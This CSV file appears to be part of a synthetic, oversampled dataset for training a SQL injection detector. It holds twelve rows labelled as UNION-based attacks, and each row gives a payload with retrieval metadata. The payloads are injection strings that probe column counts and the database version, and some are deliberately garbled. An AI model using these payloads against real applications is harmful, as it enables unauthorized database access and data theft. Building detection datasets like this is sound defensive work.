id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000189,attack,union,"-8772%""  )   union all select 5433,5433,5433,5433,5433,5433,5433,5433,5433,5433--",nearest_attack_euclidean,R000221,0.6026525818125915
SMOTE_000190,attack,union," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000069,0.08489241694887568
SMOTE_000191,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000099,0.1408486135665057
SMOTE_000192,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000032,0.013247243819475374
SMOTE_000193,attack,union,"-6965'  )   union all select 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--",nearest_attack_euclidean,R000304,0.8954729068989116
SMOTE_000194,attack,union,"1""   )    )    as hdyn where 6027  =  6027 union all select null,null,null--",nearest_attack_euclidean,R000162,0.8986849430695927
SMOTE_000195,attack,union,"-7678   )    )     )   union all select 2622,2622,2622,2622,2622,2622,2622,2622--",nearest_attack_euclidean,R000244,1.3218476054999988
SMOTE_000196,attack,union,"-4236'  )   union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",nearest_attack_euclidean,R000309,0.5443623771752301
SMOTE_000197,attack,union,1'||  (  select 'ptkj' from dual where 6263  =  6263 union all select null--,nearest_attack_euclidean,R000213,0.13134936191524266
SMOTE_000198,attack,union," select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000053,0.3089036444247702
SMOTE_000199,attack,union,"-9923%'   )    )     )   union all select 8985,8985,8985,8985,8985,8985,8985#",nearest_attack_euclidean,R000249,0.22296796748903
SMOTE_000200,attack,union,"-9451""   )    )     )   union all select 4211,4211,4211,4211,4211,4211,4211--",nearest_attack_euclidean,R000225,0.45472648070809746
